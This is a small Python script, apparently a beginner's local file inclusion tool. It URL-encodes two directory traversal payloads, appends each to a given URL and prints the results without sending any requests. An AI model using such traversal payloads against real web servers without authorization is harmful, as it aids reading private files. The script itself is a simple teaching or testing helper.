import sys
import urllib.parse


def main(url):
    # Add our payloads to the list, will be used to make requests to webserver
    payloads = [
        "/../../../../../",
        "/..//..//..//..//..//",
    ]

    # URL encode our payloads to make sure spaces and special characters are not interpreted. Otherwise, certain
    # characters will confuse the browser for example if you don't encode "&" it will think you're sending a parameter.
    encoded_payloads = []
    for payload in payloads:
        url_encoded_payload = urllib.parse.quote_plus(payload)
        encoded_payloads.append(url_encoded_payload)

    payload_count = len(encoded_payloads)
    counter = 0
    while counter < payload_count:
        url_payload = url + encoded_payloads[counter]
        print(url_payload)
        counter += 1




if __name__ == "__main__":
    if len(sys.argv) == 2:
        main(sys.argv[1])
    else:
        print("Usage: python local_file_inclusion.py <url>")